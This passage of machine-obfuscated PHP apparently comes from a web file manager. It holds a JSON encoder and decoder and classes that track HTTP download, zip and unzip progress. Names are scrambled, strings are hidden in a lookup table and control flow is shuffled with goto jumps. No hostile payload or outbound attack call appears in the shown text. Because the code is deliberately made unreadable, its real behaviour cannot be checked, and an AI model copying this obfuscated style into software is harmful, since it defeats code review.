($E¡Ÿ¡á›–ö & 252) == 248: $C‰“»´à¢ª = pack($d²ĞºÖƒÂŒ[1914], $E¡Ÿ¡á›–ö, ord($f‹è­† ¶è[$E¼ùÖÊ´¢¹ + 1]), ord($f‹è­† ¶è[$E¼ùÖÊ´¢¹ + 2]), ord($f‹è­† ¶è[$E¼ùÖÊ´¢¹ + 3]), ord($f‹è­† ¶è[$E¼ùÖÊ´¢¹ + 4])); $E¼ùÖÊ´¢¹ += 4; $EªÍãÇ´… = $this->utf82utf16($C‰“»´à¢ª); $A–Ü«¿Î¤® .= sprintf($d²ĞºÖƒÂŒ[1915], bin2hex($EªÍãÇ´…)); break; case ($E¡Ÿ¡á›–ö & 254) == 252: $C‰“»´à¢ª = pack($d²ĞºÖƒÂŒ[1914], $E¡Ÿ¡á›–ö, ord($f‹è­† ¶è[$E¼ùÖÊ´¢¹ + 1]), ord($f‹è­† ¶è[$E¼ùÖÊ´¢¹ + 2]), ord($f‹è­† ¶è[$E¼ùÖÊ´¢¹ + 3]), ord($f‹è­† ¶è[$E¼ùÖÊ´¢¹ + 4]), ord($f‹è­† ¶è[$E¼ùÖÊ´¢¹ + 5])); $E¼ùÖÊ´¢¹ += 5; $EªÍãÇ´… = $this->utf82utf16($C‰“»´à¢ª); $A–Ü«¿Î¤® .= sprintf($d²ĞºÖƒÂŒ[1915], bin2hex($EªÍãÇ´…)); break; } } return $d²ĞºÖƒÂŒ[113] . $A–Ü«¿Î¤® . $d²ĞºÖƒÂŒ[113]; case $d²ĞºÖƒÂŒ[1916]: if (is_array($f‹è­† ¶è) && count($f‹è­† ¶è) && array_keys($f‹è­† ¶è) !== range(0, sizeof($f‹è­† ¶è) - 1)) { $Dé¿ğŸÊŒ = array_map(array($this, $d²ĞºÖƒÂŒ[1917]), array_keys($f‹è­† ¶è), array_values($f‹è­† ¶è)); foreach ($Dé¿ğŸÊŒ as $FÄ¬Æ’Ï) { if (Services_JSON::isError($FÄ¬Æ’Ï)) { return $FÄ¬Æ’Ï; } } return $d²ĞºÖƒÂŒ[1064] . join($d²ĞºÖƒÂŒ[47], $Dé¿ğŸÊŒ) . $d²ĞºÖƒÂŒ[312]; } $fÜæ‚ÂÚç¸ = array_map(array($this, $d²ĞºÖƒÂŒ[1918]), $f‹è­† ¶è); foreach ($fÜæ‚ÂÚç¸ as $DÓÑ¢›ÑÎ‘) { if (Services_JSON::isError($DÓÑ¢›ÑÎ‘)) { return $DÓÑ¢›ÑÎ‘; } } return $d²ĞºÖƒÂŒ[154] . join($d²ĞºÖƒÂŒ[47], $fÜæ‚ÂÚç¸) . $d²ĞºÖƒÂŒ[472]; case $d²ĞºÖƒÂŒ[1919]: $e½Š­óÌí = get_object_vars($f‹è­† ¶è); $Dé¿ğŸÊŒ = array_map(array($this, $d²ĞºÖƒÂŒ[1917]), array_keys($e½Š­óÌí), array_values($e½Š­óÌí)); foreach ($Dé¿ğŸÊŒ as $FÄ¬Æ’Ï) { if (Services_JSON::isError($FÄ¬Æ’Ï)) { return $FÄ¬Æ’Ï; } } return $d²ĞºÖƒÂŒ[1064] . join($d²ĞºÖƒÂŒ[47], $Dé¿ğŸÊŒ) . $d²ĞºÖƒÂŒ[312]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $d²ĞºÖƒÂŒ[101] : new Services_JSON_Error(gettype($f‹è­† ¶è) . $d²ĞºÖƒÂŒ[1920]); } } function name_value($Aâ¦—ËÇ×¢, $c¶¶Ğ—ì¦˜) { $A‹Şã«Œ‚‚ = $this->encode($c¶¶Ğ—ì¦˜); if (Services_JSON::isError($A‹Şã«Œ‚‚)) { return $A‹Şã«Œ‚‚; } return $this->encode(strval($Aâ¦—ËÇ×¢)) . $_SERVER[¢à][4] . $A‹Şã«Œ‚‚; } function reduce_string($fàÈšÜ™ë) { $f“®¤ ¤ =& $_SERVER[¢à]; $fàÈšÜ™ë = preg_replace(array($f“®¤ ¤[1921], $f“®¤ ¤[1922], $f“®¤ ¤[1923]), $f“®¤ ¤[33], $fàÈšÜ™ë); return trim($fàÈšÜ™ë); } function decode($Dƒà²”²¥È) { $cºÑ¦ÍÃ’ =& $_SERVER[¢à]; $Dƒà²”²¥È = $this->reduce_string($Dƒà²”²¥È); switch (strtolower($Dƒà²”²¥È)) { case $cºÑ¦ÍÃ’[1571]: return !0; case $cºÑ¦ÍÃ’[1573]: return !1; case $cºÑ¦ÍÃ’[101]: return null; default: $F“…ßø§ = array(); if (is_numeric($Dƒà²”²¥È)) { return (double) $Dƒà²”²¥È == (int) $Dƒà²”²¥È ? (int) $Dƒà²”²¥È : (double) $Dƒà²”²¥È; } elseif (preg_match($cºÑ¦ÍÃ’[1924], $Dƒà²”²¥È, $F“…ßø§) && $F“…ßø§[1] == $F“…ßø§[2]) { $BÊâƒ°«„ò = substr($Dƒà²”²¥È, 0, 1); $dÄ˜ÄˆÍèí = substr($Dƒà²”²¥È, 1, -1); $E é¦§Òí¯ = $cºÑ¦ÍÃ’[33]; $FÀ‘ãÆõ¥¹ = strlen($dÄ˜ÄˆÍèí); for ($FÀâ±ß÷º¿ = 0; $FÀâ±ß÷º¿ < $FÀ‘ãÆõ¥¹; ++$FÀâ±ß÷º¿) { $e÷’‰ˆ²ïö = substr($dÄ˜ÄˆÍèí, $FÀâ±ß÷º¿, 2); $cŸ”»‚¦œç = ord($dÄ˜ÄˆÍèí[$FÀâ±ß÷º¿]); switch (!0) { case $e÷’‰ˆ²ïö == $cºÑ¦ÍÃ’[1912]: $E é¦§Òí¯ .= chr(8); ++$FÀâ±ß÷º¿; break; case $e÷’‰ˆ²ïö == $cºÑ¦ÍÃ’[1548]: $E é¦§Òí¯ .= chr(9); ++$FÀâ±ß÷º¿; break; case $e÷’‰ˆ²ïö == $cºÑ¦ÍÃ’[1546]: $E é¦§Òí¯ .= chr(10); ++$FÀâ±ß÷º¿; break; case $e÷’‰ˆ²ïö == $cºÑ¦ÍÃ’[1913]: $E é¦§Òí¯ .= chr(12); ++$FÀâ±ß÷º¿; break; case $e÷’‰ˆ²ïö == $cºÑ¦ÍÃ’[1547]: $E é¦§Òí¯ .= chr(13); ++$FÀâ±ß÷º¿; break; case $e÷’‰ˆ²ïö == $cºÑ¦ÍÃ’[1329]: case $e÷’‰ˆ²ïö == $cºÑ¦ÍÃ’[1925]: case $e÷’‰ˆ²ïö == $cºÑ¦ÍÃ’[1541]: case $e÷’‰ˆ²ïö == $cºÑ¦ÍÃ’[1543]: if ($BÊâƒ°«„ò == $cºÑ¦ÍÃ’[113] && $e÷’‰ˆ²ïö != $cºÑ¦ÍÃ’[1925] || $BÊâƒ°«„ò == $cºÑ¦ÍÃ’[55] && $e÷’‰ˆ²ïö != $cºÑ¦ÍÃ’[1329]) { $E é¦§Òí¯ .= $dÄ˜ÄˆÍèí[++$FÀâ±ß÷º¿]; } break; case preg_match($cºÑ¦ÍÃ’[1926], substr($dÄ˜ÄˆÍèí, $FÀâ±ß÷º¿, 6)): $CÛ¨‡©™¤ = chr(hexdec(substr($dÄ˜ÄˆÍèí, $FÀâ±ß÷º¿ + 2, 2))) . chr(hexdec(substr($dÄ˜ÄˆÍèí, $FÀâ±ß÷º¿ + 4, 2))); $E é¦§Òí¯ .= $this->utf162utf8($CÛ¨‡©™¤); $FÀâ±ß÷º¿ += 5; break; case $cŸ”»‚¦œç >= 32 && $cŸ”»‚¦œç <= 127: $E é¦§Òí¯ .= $dÄ˜ÄˆÍèí[$FÀâ±ß÷º¿]; break; case ($cŸ”»‚¦œç & 224) == 192: $E é¦§Òí¯ .= substr($dÄ˜ÄˆÍèí, $FÀâ±ß÷º¿, 2); ++$FÀâ±ß÷º¿; break; case ($cŸ”»‚¦œç & 240) == 224: $E é¦§Òí¯ .= substr($dÄ˜ÄˆÍèí, $FÀâ±ß÷º¿, 3); $FÀâ±ß÷º¿ += 2; break; case ($cŸ”»‚¦œç & 248) == 240: $E é¦§Òí¯ .= substr($dÄ˜ÄˆÍèí, $FÀâ±ß÷º¿, 4); $FÀâ±ß÷º¿ += 3; break; case ($cŸ”»‚¦œç & 252) == 248: $E é¦§Òí¯ .= substr($dÄ˜ÄˆÍèí, $FÀâ±ß÷º¿, 5); $FÀâ±ß÷º¿ += 4; break; case ($cŸ”»‚¦œç & 254) == 252: $E é¦§Òí¯ .= substr($dÄ˜ÄˆÍèí, $FÀâ±ß÷º¿, 6); $FÀâ±ß÷º¿ += 5; break; } } return $E é¦§Òí¯; } elseif (preg_match($cºÑ¦ÍÃ’[1927], $Dƒà²”²¥È) || preg_match($cºÑ¦ÍÃ’[1928], $Dƒà²”²¥È)) { goto d–Òö‹£ƒ; E§î¾ÏòÚÇ: for ($FÀâ±ß÷º¿ = 0; $FÀâ±ß÷º¿ <= $FÀ‘ãÆõ¥¹; ++$FÀâ±ß÷º¿) { $AİßÁòğò = end($Bã¬¡İó‘); $e÷’‰ˆ²ïö = substr($dÄ˜ÄˆÍèí, $FÀâ±ß÷º¿, 2); if ($FÀâ±ß÷º¿ == $FÀ‘ãÆõ¥¹ || $dÄ˜ÄˆÍèí[$FÀâ±ß÷º¿] == $cºÑ¦ÍÃ’[47] && $AİßÁòğò[$cºÑ¦ÍÃ’[1929]] == SERVICES_JSON_SLICE) { $BÔ¤ •³§ê = substr($dÄ˜ÄˆÍèí, $AİßÁòğò[$cºÑ¦ÍÃ’[260]], $FÀâ±ß÷º¿ - $AİßÁòğò[$cºÑ¦ÍÃ’[260]]); array_push($Bã¬¡İó‘, array($cºÑ¦ÍÃ’[1929] => SERVICES_JSON_SLICE, $cºÑ¦ÍÃ’[260] => $FÀâ±ß÷º¿ + 1, $cºÑ¦ÍÃ’[1930] => !1)); if (reset($Bã¬¡İó‘) == SERVICES_JSON_IN_ARR) { array_push($aŠƒ¤´½, $this->decode($BÔ¤ •³§ê)); } elseif (reset($Bã¬¡İó‘) == SERVICES_JSON_IN_OBJ) { $a«Ç³İ‹³ˆ = array(); if (preg_match($cºÑ¦ÍÃ’[1931], $BÔ¤ •³§ê, $a«Ç³İ‹³ˆ)) { $b²µç»ß = $this->decode($a«Ç³İ‹³ˆ[1]); $aÉË°ÒíŠÈ = $this->decode($a«Ç³İ‹³ˆ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $CÎ±Í…¥óÈ[$b²µç»ß] = $aÉË°ÒíŠÈ; } else { $CÎ±Í…¥óÈ->{$b²µç»ß} = $aÉË°ÒíŠÈ; } } elseif (preg_match($cºÑ¦ÍÃ’[1932], $BÔ¤ •³§ê, $a«Ç³İ‹³ˆ)) { $b²µç»ß = $a«Ç³İ‹³ˆ[1]; $aÉË°ÒíŠÈ = $this->decode($a«Ç³İ‹³ˆ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $CÎ±Í…¥óÈ[$b²µç»ß] = $aÉË°ÒíŠÈ; } else { $CÎ±Í…¥óÈ->{$b²µç»ß} = $aÉË°ÒíŠÈ; } } } } elseif (($dÄ˜ÄˆÍèí[$FÀâ±ß÷º¿] == $cºÑ¦ÍÃ’[113] || $dÄ˜ÄˆÍèí[$FÀâ±ß÷º¿] == $cºÑ¦ÍÃ’[55]) && $AİßÁòğò[$cºÑ¦ÍÃ’[1929]] != SERVICES_JSON_IN_STR) { array_push($Bã¬¡İó‘, array($cºÑ¦ÍÃ’[1929] => SERVICES_JSON_IN_STR, $cºÑ¦ÍÃ’[260] => $FÀâ±ß÷º¿, $cºÑ¦ÍÃ’[1930] => $dÄ˜ÄˆÍèí[$FÀâ±ß÷º¿])); } elseif ($dÄ˜ÄˆÍèí[$FÀâ±ß÷º¿] == $AİßÁòğò[$cºÑ¦ÍÃ’[1930]] && $AİßÁòğò[$cºÑ¦ÍÃ’[1929]] == SERVICES_JSON_IN_STR && (strlen(substr($dÄ˜ÄˆÍèí, 0, $FÀâ±ß÷º¿)) - strlen(rtrim(substr($dÄ˜ÄˆÍèí, 0, $FÀâ±ß÷º¿), $cºÑ¦ÍÃ’[95]))) % 2 != 1) { array_pop($Bã¬¡İó‘); } elseif ($dÄ˜ÄˆÍèí[$FÀâ±ß÷º¿] == $cºÑ¦ÍÃ’[154] && in_array($AİßÁòğò[$cºÑ¦ÍÃ’[1929]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Bã¬¡İó‘, array($cºÑ¦ÍÃ’[1929] => SERVICES_JSON_IN_ARR, $cºÑ¦ÍÃ’[260] => $FÀâ±ß÷º¿, $cºÑ¦ÍÃ’[1930] => !1)); } elseif ($dÄ˜ÄˆÍèí[$FÀâ±ß÷º¿] == $cºÑ¦ÍÃ’[472] && $AİßÁòğò[$cºÑ¦ÍÃ’[1929]] == SERVICES_JSON_IN_ARR) { array_pop($Bã¬¡İó‘); } elseif ($dÄ˜ÄˆÍèí[$FÀâ±ß÷º¿] == $cºÑ¦ÍÃ’[1064] && in_array($AİßÁòğò[$cºÑ¦ÍÃ’[1929]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Bã¬¡İó‘, array($cºÑ¦ÍÃ’[1929] => SERVICES_JSON_IN_OBJ, $cºÑ¦ÍÃ’[260] => $FÀâ±ß÷º¿, $cºÑ¦ÍÃ’[1930] => !1)); } elseif ($dÄ˜ÄˆÍèí[$FÀâ±ß÷º¿] == $cºÑ¦ÍÃ’[312] && $AİßÁòğò[$cºÑ¦ÍÃ’[1929]] == SERVICES_JSON_IN_OBJ) { array_pop($Bã¬¡İó‘); } elseif ($e÷’‰ˆ²ïö == $cºÑ¦ÍÃ’[1933] && in_array($AİßÁòğò[$cºÑ¦ÍÃ’[1929]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Bã¬¡İó‘, array($cºÑ¦ÍÃ’[1929] => SERVICES_JSON_IN_CMT, $cºÑ¦ÍÃ’[260] => $FÀâ±ß÷º¿, $cºÑ¦ÍÃ’[1930] => !1)); $FÀâ±ß÷º¿++; } elseif ($e÷’‰ˆ²ïö == $cºÑ¦ÍÃ’[1934] && $AİßÁòğò[$cºÑ¦ÍÃ’[1929]] == SERVICES_JSON_IN_CMT) { array_pop($Bã¬¡İó‘); $FÀâ±ß÷º¿++; for ($Cï ›„Ùöï = $AİßÁòğò[$cºÑ¦ÍÃ’[260]]; $Cï ›„Ùöï <= $FÀâ±ß÷º¿; ++$Cï ›„Ùöï) { $dÄ˜ÄˆÍèí = substr_replace($dÄ˜ÄˆÍèí, $cºÑ¦ÍÃ’[50], $Cï ›„Ùöï, 1); } } } if (reset($Bã¬¡İó‘) == SERVICES_JSON_IN_ARR) { return $aŠƒ¤´½; } elseif (reset($Bã¬¡İó‘) == SERVICES_JSON_IN_OBJ) { return $CÎ±Í…¥óÈ; } goto B¶©ÊÚ–Ïè; d–Òö‹£ƒ: if ($Dƒà²”²¥È[0] == $cºÑ¦ÍÃ’[154]) { $Bã¬¡İó‘ = array(SERVICES_JSON_IN_ARR); $aŠƒ¤´½ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $Bã¬¡İó‘ = array(SERVICES_JSON_IN_OBJ); $CÎ±Í…¥óÈ = array(); } else { $Bã¬¡İó‘ = array(SERVICES_JSON_IN_OBJ); $CÎ±Í…¥óÈ = new stdClass(); } } array_push($Bã¬¡İó‘, array($cºÑ¦ÍÃ’[1929] => SERVICES_JSON_SLICE, $cºÑ¦ÍÃ’[260] => 0, $cºÑ¦ÍÃ’[1930] => !1)); $dÄ˜ÄˆÍèí = substr($Dƒà²”²¥È, 1, -1); goto Fí§ÜÁ§¥ô; Fí§ÜÁ§¥ô: $dÄ˜ÄˆÍèí = $this->reduce_string($dÄ˜ÄˆÍèí); if ($dÄ˜ÄˆÍèí == $cºÑ¦ÍÃ’[33]) { if (reset($Bã¬¡İó‘) == SERVICES_JSON_IN_ARR) { return $aŠƒ¤´½; } else { return $CÎ±Í…¥óÈ; } } $FÀ‘ãÆõ¥¹ = strlen($dÄ˜ÄˆÍèí); goto E§î¾ÏòÚÇ; B¶©ÊÚ–Ïè: } } } function isError($BáóœÙìÁø, $D‹­äÕŒÛ = null) { $e‘ï¨É¹†ö =& $_SERVER[¢à]; if (class_exists($e‘ï¨É¹†ö[1935])) { return PEAR::isError($BáóœÙìÁø, $D‹­äÕŒÛ); } elseif (is_object($BáóœÙìÁø) && (get_class($BáóœÙìÁø) == $e‘ï¨É¹†ö[1936] || is_subclass_of($BáóœÙìÁø, $e‘ï¨É¹†ö[1936]))) { return !0; } return !1; } } goto B…Ö‘ì­·³; f‚œ¡¯Š: class TaskHttp extends Task { protected function startAfter() { $BÙŒ¶áŸã =& $_SERVER[¢à]; Hook::bind($BÙŒ¶áŸã[1449], array($this, $BÙŒ¶áŸã[1472])); Hook::bind($BÙŒ¶áŸã[1451], array($this, $BÙŒ¶áŸã[1473])); Hook::bind($BÙŒ¶áŸã[1453], array($this, $BÙŒ¶áŸã[1474])); } protected function endAfter() { $Aø‘ïÃ‡á¸ =& $_SERVER[¢à]; Hook::unbind($Aø‘ïÃ‡á¸[1449], array($this, $Aø‘ïÃ‡á¸[1472])); Hook::unbind($Aø‘ïÃ‡á¸[1451], array($this, $Aø‘ïÃ‡á¸[1473])); Hook::unbind($Aø‘ïÃ‡á¸[1453], array($this, $Aø‘ïÃ‡á¸[1474])); } public function progressStart($d…ç‡Øë÷) { $A÷‰«ÛÓ‡ =& $_SERVER[¢à]; $f…Ô†¢Üá = curl_getinfo($d…ç‡Øë÷); self::log($A÷‰«ÛÓ‡[1475] . $f…Ô†¢Üá[$A÷‰«ÛÓ‡[292]]); self::valueSet($this->task[$A÷‰«ÛÓ‡[364]], $this->task); } public function progressEnd($A‚Î˜²Î ¶) { $d˜Àäê°ğ =& $_SERVER[¢à]; self::log($d˜Àäê°ğ[1476] . $this->task[$d˜Àäê°ğ[364]]); $this->end(); } public function progress($bŠÅÊ¥´Êù, $E’ÓÅÙªÚÊ, $c†Üì‚›»å, $FËºˆÜÅî‡, $FĞù¾¢ŸÁĞ) { $D“³©¨ÅØ =& $_SERVER[¢à]; $BµÈ±•’ƒ¿ =& $this->task; if ($FĞù¾¢ŸÁĞ > 0) { $BµÈ±•’ƒ¿[$D“³©¨ÅØ[974]] = $BµÈ±•’ƒ¿[$D“³©¨ÅØ[974]] == 0 ? $FËºˆÜÅî‡ : $BµÈ±•’ƒ¿[$D“³©¨ÅØ[974]]; $BµÈ±•’ƒ¿[$D“³©¨ÅØ[986]] = $FĞù¾¢ŸÁĞ; } else { if ($c†Üì‚›»å > 0) { $BµÈ±•’ƒ¿[$D“³©¨ÅØ[974]] = $BµÈ±•’ƒ¿[$D“³©¨ÅØ[974]] == 0 ? $E’ÓÅÙªÚÊ : $BµÈ±•’ƒ¿[$D“³©¨ÅØ[974]]; $BµÈ±•’ƒ¿[$D“³©¨ÅØ[986]] = $c†Üì‚›»å; } } $this->update(); self::log("\x70\162\157\147\162\145\163\x73\x48\164\164\x70\x3a\144\x6f\167\156\x3a{$c†Üì‚›»å}\57{$E’ÓÅÙªÚÊ}\x3b\x20\x75\x70\154\x6f\141\x64\x3a{$FĞù¾¢ŸÁĞ}\x2f{$FËºˆÜÅî‡}\x3b"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto aêµ„«§…›; c°°´©Å: if (!$E»àå©èŒÜ[$b†„„Õ“º‡[1317]]) { $E»àå©èŒÜ[$b†„„Õ“º‡[1317]] = LNG($b†„„Õ“º‡[1481]); } goto EŒèÉ¨À; aêµ„«§…›: $b†„„Õ“º‡ =& $_SERVER[¢à]; parent::startAfter(); Hook::bind($b†„„Õ“º‡[1477], array($this, $b†„„Õ“º‡[1478])); goto e˜¥™èÉ’; e˜¥™èÉ’: Hook::bind($b†„„Õ“º‡[1031], array($this, $b†„„Õ“º‡[1479])); $E»àå©èŒÜ =& $this->task; $E»àå©èŒÜ[$b†„„Õ“º‡[1480]] = $b†„„Õ“º‡[1036]; goto c°°´©Å; EŒèÉ¨À: } protected function endAfter() { $c©ÒĞ¶• =& $_SERVER[¢à]; parent::endAfter(); Hook::unbind($c©ÒĞ¶•[1477], array($this, $c©ÒĞ¶•[1478])); Hook::unbind($c©ÒĞ¶•[1031], array($this, $c©ÒĞ¶•[1479])); } public function updateAfter() { $F‹­›ø„¹ =& $_SERVER[¢à]; $cŠ¸œï®ŸÓ =& $this->task; if (!$cŠ¸œï®ŸÓ[$F‹­›ø„¹[974]] || !$cŠ¸œï®ŸÓ[$F‹­›ø„¹[698]]) { return; } if ($cŠ¸œï®ŸÓ[$F‹­›ø„¹[1480]] == $F‹­›ø„¹[1036]) { $AÏ•÷¼»©Õ = 0; if ($cŠ¸œï®ŸÓ[$F‹­›ø„¹[1457]]) { $AÏ•÷¼»©Õ = $cŠ¸œï®ŸÓ[$F‹­›ø„¹[1458]] / $cŠ¸œï®ŸÓ[$F‹­›ø„¹[1457]]; } $cŠ¸œï®ŸÓ[$F‹­›ø„¹[1413]] = $AÏ•÷¼»©Õ * 0.3; } else { if ($cŠ¸œï®ŸÓ[$F‹­›ø„¹[1480]] == $F‹­›ø„¹[298]) { $AÏ•÷¼»©Õ = $cŠ¸œï®ŸÓ[$F‹­›ø„¹[986]] / $cŠ¸œï®ŸÓ[$F‹­›ø„¹[974]]; $cŠ¸œï®ŸÓ[$F‹­›ø„¹[1413]] = 0.3 + $AÏ•÷¼»©Õ * 0.4; } else { if ($cŠ¸œï®ŸÓ[$F‹­›ø„¹[1480]] == $F‹­›ø„¹[91]) { $DÙÍ–Ä££ö = 0; if ($cŠ¸œï®ŸÓ[$F‹­›ø„¹[1459]] == $F‹­›ø„¹[91]) { $DÙÍ–Ä££ö = $cŠ¸œï®ŸÓ[$F‹­›ø„¹[1458]]; } $AÏ•÷¼»©Õ = ($cŠ¸œï®ŸÓ[$F‹­›ø„¹[1462]] + $DÙÍ–Ä££ö) / $cŠ¸œï®ŸÓ[$F‹­›ø„¹[698]]; $cŠ¸œï®ŸÓ[$F‹­›ø„¹[1413]] = 0.3 + 0.4 + $AÏ•÷¼»©Õ * 0.3; } } } if ($cŠ¸œï®ŸÓ[$F‹­›ø„¹[1413]] > 0) { $a¾ã¾Æ¸‡½ = timeFloat() - $cŠ¸œï®ŸÓ[$F‹­›ø„¹[1415]] - $cŠ¸œï®ŸÓ[$F‹­›ø„¹[1418]]; $cŠ¸œï®ŸÓ[$F‹­›ø„¹[1419]] = $a¾ã¾Æ¸‡½ * (1 - $cŠ¸œï®ŸÓ[$F‹­›ø„¹[1413]]) / $cŠ¸œï®ŸÓ[$F‹­›ø„¹[1413]]; } } public function addFile($BùÚ²öÒ“…) { goto EÍÓîòŸÕ‰; A«ƒíÏŒ™°: $this->update(); goto DµÃ¨‡‡Ó÷; EÍÓîòŸÕ‰: $Dëç¢¬æ˜Â =& $_SERVER[¢à]; $D˜Ó¼îçÓê =& $this->task; $F­ŠĞÇá®È = IO::info($BùÚ²öÒ“…); goto aÀß¹“ŸÕ; Bø¦İ¸İˆà: $D˜Ó¼îçÓê[$Dëç¢¬æ˜Â[976]] = $Dëç¢¬æ˜Â[1470]; $D˜Ó¼îçÓê[$Dëç¢¬æ˜Â[1459]] = $Dëç¢¬æ˜Â[1036]; $D˜Ó¼îçÓê[$Dëç¢¬æ˜Â[698]] = $F­ŠĞÇá®È[$Dëç¢¬æ˜Â[77]]; goto dà—Ï›ƒç„; aÀß¹“ŸÕ: $D˜Ó¼îçÓê[$Dëç¢¬æ˜Â[1455]] = $F­ŠĞÇá®È[$Dëç¢¬æ˜Â[28]]; $D˜Ó¼îçÓê[$Dëç¢¬æ˜Â[1457]] = $F­ŠĞÇá®È[$Dëç¢¬æ˜Â[77]]; $D˜Ó¼îçÓê[$Dëç¢¬æ˜Â[1458]] = 0; goto Bø¦İ¸İˆà; dà—Ï›ƒç„: $D˜Ó¼îçÓê[$Dëç¢¬æ˜Â[974]] = 1; $d¬­îàÛ¨© = 0; $D˜Ó¼îçÓê[$Dëç¢¬æ˜Â[1463]] = array($Dëç¢¬æ˜Â[1464] => $d¬­îàÛ¨© + 1, $Dëç¢¬æ˜Â[383] => $F­ŠĞÇá®È[$Dëç¢¬æ˜Â[28]], $Dëç¢¬æ˜Â[75] => $F­ŠĞÇá®È[$Dëç¢¬æ˜Â[75]], $Dëç¢¬æ˜Â[462] => $F­ŠĞÇá®È[$Dëç¢¬æ˜Â[462]] ? $F­ŠĞÇá®È[$Dëç¢¬æ˜Â[462]] : $F­ŠĞÇá®È[$Dëç¢¬æ˜Â[75]]); goto A«ƒíÏŒ™°; DµÃ¨‡‡Ó÷: } public function unzipAfter($f×Ñ¼Å¨‹“) { goto F³ÅÌàš±–; eÙáã™«Çæ: $dÌ¹ÉßÄ®´[$aÕšŒ–¤¾[1455]] = $aÕšŒ–¤¾[33]; $dÌ¹ÉßÄ®´[$aÕšŒ–¤¾[1462]] = 0; $dÌ¹ÉßÄ®´[$aÕšŒ–¤¾[698]] = $bö´‡ß[$aÕšŒ–¤¾[77]]; goto a•³‡Ú‘; F³ÅÌàš±–: $aÕšŒ–¤¾ =& $_SERVER[¢à]; $dÌ¹ÉßÄ®´ =& $this->task; $dÌ¹ÉßÄ®´[$aÕšŒ–¤¾[1480]] = $aÕšŒ–¤¾[91]; goto DîÀ¡Ç†Œ¯; Cõí„²Ğ·„: if ($bö´‡ß[$aÕšŒ–¤¾[29]] == $aÕšŒ–¤¾[164]) { $dÌ¹ÉßÄ®´[$aÕšŒ–¤¾[974]] = 1; } else { $dÌ¹ÉßÄ®´[$aÕšŒ–¤¾[974]] = $bö´‡ß[$aÕšŒ–¤¾[80]][$aÕšŒ–¤¾[78]]; } $dÌ¹ÉßÄ®´[$aÕšŒ–¤¾[976]] = $aÕšŒ–¤¾[33]; $dÌ¹ÉßÄ®´[$aÕšŒ–¤¾[1459]] = 0; goto e§Ò­¥ÚÓÄ; DîÀ¡Ç†Œ¯: $bö´‡ß = IO::infoWithChildren($f×Ñ¼Å¨‹“); $BÌ…ÒåÕ±İ = 0; $dÌ¹ÉßÄ®´[$aÕšŒ–¤¾[1463]] = array($aÕšŒ–¤¾[1464] => $BÌ…ÒåÕ±İ + 1, $aÕšŒ–¤¾[383] => $bö´‡ß[$aÕšŒ–¤¾[28]], $aÕšŒ–¤¾[75] => $bö´‡ß[$aÕšŒ–¤¾[75]], $aÕšŒ–¤¾[462] => $bö´‡ß[$aÕšŒ–¤¾[462]] ? $bö´‡ß[$aÕšŒ–¤¾[462]] : $bö´‡ß[$aÕšŒ–¤¾[75]]); goto Cõí„²Ğ·„; a•³‡Ú‘: $this->update(); self::log($aÕšŒ–¤¾[1482] . json_encode(array($dÌ¹ÉßÄ®´, $bö´‡ß))); goto fšÂä¶½ÃÈ; e§Ò­¥ÚÓÄ: $dÌ¹ÉßÄ®´[$aÕšŒ–¤¾[986]] = 0; $dÌ¹ÉßÄ®´[$aÕšŒ–¤¾[1457]] = 0; $dÌ¹ÉßÄ®´[$aÕšŒ–¤¾[1458]] = 0; goto eÙáã™«Çæ; fšÂä¶½ÃÈ: } public function nameParse($E‘ÃÛ´ä™¥) { goto F¾©°‰Õ¤ê; fµÚáÉ‘ëÊ: $this->update(); goto FÌ—½¹‡³„; F¾©°‰Õ¤ê: $D”…ßƒ¼·Á =& $_SERVER[¢à]; $C£”˜”¬å =& $this->task; if ($C£”˜”¬å[$D”…ßƒ¼·Á[1480]] == $D”…ßƒ¼·Á[1036]) { $C£”˜”¬å[$D”…ßƒ¼·Á[1480]] = $D”…ßƒ¼·Á[298]; $C£”˜”¬å[$D”…ßƒ¼·Á[1462]] = 0; $C£”˜”¬å[$D”…ßƒ¼·Á[698]] = 0; } goto CàØ¶Ï; CàØ¶Ï: $D»ÑÜíÚª = get_path_this($E‘ÃÛ´ä™¥); if (strstr($D»ÑÜíÚª, $D”…ßƒ¼·Á[93])) { $C£”˜”¬å[$D”…ßƒ¼·Á[986]] += 1; $C£”˜”¬å[$D”…ßƒ¼·Á[974]] += 1; } $C£”˜”¬å[$D”…ßƒ¼·Á[1455]] = $E‘ÃÛ´ä™¥; goto fµÚáÉ‘ëÊ; FÌ—½¹‡³„: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $fÄ‚ç÷çİ¸ =& $_SERVER[¢à]; parent::startAfter(); Hook::bind($fÄ‚ç÷çİ¸[1483], array($this, $fÄ‚ç÷çİ¸[1478])); $e‚‡ ÑÌå =& $this->task; $e‚‡ ÑÌå[$fÄ‚ç÷çİ¸[1480]] = $fÄ‚ç÷çİ¸[1036]; if (!$e‚‡ ÑÌå[$fÄ‚ç÷çİ¸[1317]]) { $e‚‡ ÑÌå[$fÄ‚ç÷çİ¸[1317]] = LNG($fÄ‚ç÷çİ¸[1484]); } } protected function endAfter() { $aŠËÕÉƒß =& $_SERVER[¢à]; parent::endAfter(); Hook::unbind($aŠËÕÉƒß[1483], array($this, $aŠËÕÉƒß[1478])); } public function updateAfter() { $aƒÔÑ‚Ò¹§ =& $_SERVER[¢à]; $B„–˜ÈºšÍ =& $this->task; if (!$B„–˜ÈºšÍ[$aƒÔÑ‚Ò¹§[974]] || !$B„–˜ÈºšÍ[$aƒÔÑ‚Ò¹§[698]]) { return; } if ($B„–˜ÈºšÍ[$aƒÔÑ‚Ò¹§[1480]] == $aƒÔÑ‚Ò¹§[1036]) { $AÇÒŒ½›†Ë = $B„–˜ÈºšÍ[$aƒÔÑ‚Ò¹§[1458]]; if ($B„–˜ÈºšÍ[$aƒÔÑ‚Ò¹§[1459]] != $aƒÔÑ‚Ò¹§[1036]) { $AÇÒŒ½›†Ë = 0; } $déâêö¦¢ = 